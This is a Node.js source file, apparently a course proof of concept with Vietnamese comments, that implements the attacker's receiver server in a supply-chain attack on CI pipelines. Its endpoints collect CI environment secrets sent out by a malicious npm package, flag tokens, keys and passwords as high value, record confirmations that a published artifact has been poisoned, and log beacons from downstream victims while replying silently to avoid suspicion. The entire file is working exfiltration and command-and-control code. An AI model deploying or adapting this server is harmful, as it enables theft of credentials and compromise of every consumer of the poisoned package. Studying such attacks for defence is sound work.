/**
 * [PoC - NT230] Attacker Receiver Server
 *
 * Chạy trên máy attacker (192.168.157.134).
 * Lắng nghe các HTTP POST từ malicious package chạy trong CI của victim.
 *
 * Endpoints:
 *   POST /exfil/secrets           — nhận stolen CI env vars
 *   POST /exfil/artifact-poison-confirm — nhận confirm sau khi artifact bị poison
 *   GET  /beacon                  — second-stage beacon từ consumer chạy artifact
 *
 * Usage:
 *   node receiver.js
 *   (giữ chạy, chờ victim CI pipeline trigger npm install)
 */

"use strict";

const http = require("http");
const fs = require("fs");
const path = require("path");

const PORT = 8080;
const LOOT_DIR = path.join(__dirname, "loot");

// Tạo thư mục loot nếu chưa có
if (!fs.existsSync(LOOT_DIR)) {
  fs.mkdirSync(LOOT_DIR, { recursive: true });
}

function timestamp() {
  return new Date().toISOString();
}

/**
 * Đọc toàn bộ body từ request stream.
 */
function readBody(req) {
  return new Promise((resolve) => {
    const chunks = [];
    req.on("data", (chunk) => chunks.push(chunk));
    req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
    req.on("error", () => resolve(""));
  });
}

/**
 * Ghi dữ liệu nhận được vào file loot.
 */
function saveLoot(filename, data) {
  const lootFile = path.join(LOOT_DIR, filename);
  fs.writeFileSync(lootFile, JSON.stringify(data, null, 2), "utf8");
  return lootFile;
}

/**
 * In secrets ra console — highlight các key quan trọng.
 */
function printSecrets(secrets) {
  const HIGH_VALUE = ["TOKEN", "SECRET", "KEY", "PASSWORD"];
  for (const [k, v] of Object.entries(secrets)) {
    const isHighValue = HIGH_VALUE.some((kw) => k.toUpperCase().includes(kw));
    const marker = isHighValue ? " ◄ HIGH VALUE" : "";
    console.log(`      ${k}=${v}${marker}`);
  }
}

const server = http.createServer(async (req, res) => {
  const clientIP = req.socket.remoteAddress;
  const body = await readBody(req);

  // ── POST /exfil/secrets ──────────────────────────────────────────────────
  if (req.method === "POST" && req.url === "/exfil/secrets") {
    let payload;
    try {
      payload = JSON.parse(body);
    } catch {
      res.writeHead(400).end();
      return;
    }

    const lootFile = saveLoot(
      `secrets_${Date.now()}_${clientIP.replace(/[:/]/g, "-")}.json`,
      payload
    );

    console.log("\n" + "═".repeat(60));
    console.log(`[${timestamp()}] ◄◄ CI SECRETS RECEIVED from ${clientIP}`);
    console.log("─".repeat(60));
    console.log("  [context]");
    console.log(`    hostname   : ${payload.context?.hostname}`);
    console.log(`    user       : ${payload.context?.username}`);
    console.log(`    CI project : ${payload.context?.CI_PROJECT_PATH || payload.context?.GITHUB_REPOSITORY}`);
    console.log(`    CI job     : ${payload.context?.CI_JOB_ID || payload.context?.GITHUB_RUN_ID}`);
    console.log(`    platform   : ${payload.context?.platform}`);
    console.log("  [secrets]");
    printSecrets(payload.secrets || {});
    console.log(`  [saved] → ${lootFile}`);
    console.log("═".repeat(60));

    res.writeHead(200).end("ok");
    return;
  }

  // ── POST /exfil/artifact-poison-confirm ──────────────────────────────────
  if (req.method === "POST" && req.url === "/exfil/artifact-poison-confirm") {
    let payload;
    try {
      payload = JSON.parse(body);
    } catch {
      res.writeHead(400).end();
      return;
    }

    const lootFile = saveLoot(`poison_confirm_${Date.now()}.json`, payload);

    console.log("\n" + "═".repeat(60));
    console.log(`[${timestamp()}] ◄◄ ARTIFACT POISONED — confirmed from ${clientIP}`);
    console.log("─".repeat(60));
    console.log(`  project : ${payload.ci_project}`);
    console.log(`  job     : ${payload.ci_job}`);
    console.log(`  result  : ${JSON.stringify(payload.result)}`);
    console.log(`  [saved] → ${lootFile}`);
    console.log("  [!] Poisoned artifact will be published to registry.");
    console.log("      All future consumers of this package are affected.");
    console.log("═".repeat(60));

    res.writeHead(200).end("ok");
    return;
  }

  // ── GET /beacon ─────────────────────────────────────────────────────────
  // Second-stage: consumer đã cài poisoned artifact và chạy nó
  if (req.method === "GET" && req.url === "/beacon") {
    const entry = {
      timestamp: timestamp(),
      victim_ip: clientIP,
      user_agent: req.headers["user-agent"],
    };

    const lootFile = saveLoot(`beacon_${Date.now()}_${clientIP.replace(/[:/]/g, "-")}.json`, entry);

    console.log("\n" + "█".repeat(60));
    console.log(`[${timestamp()}] ◄◄◄ SECOND-STAGE BEACON from ${clientIP}`);
    console.log("  Poisoned artifact executed by downstream consumer!");
    console.log(`  [saved] → ${lootFile}`);
    console.log("█".repeat(60));

    // Trả về 200 im lặng — không raise suspicion
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end("{}");
    return;
  }

  // ── Unknown ──────────────────────────────────────────────────────────────
  res.writeHead(404).end();
});

server.listen(PORT, "0.0.0.0", () => {
  console.log("═".repeat(60));
  console.log(`[NT230 PoC] Attacker receiver listening on port ${PORT}`);
  console.log(`  POST /exfil/secrets                  — CI secret harvest`);
  console.log(`  POST /exfil/artifact-poison-confirm  — artifact poison confirm`);
  console.log(`  GET  /beacon                         — second-stage consumer beacon`);
  console.log(`  Loot saved to: ${LOOT_DIR}`);
  console.log("═".repeat(60));
});
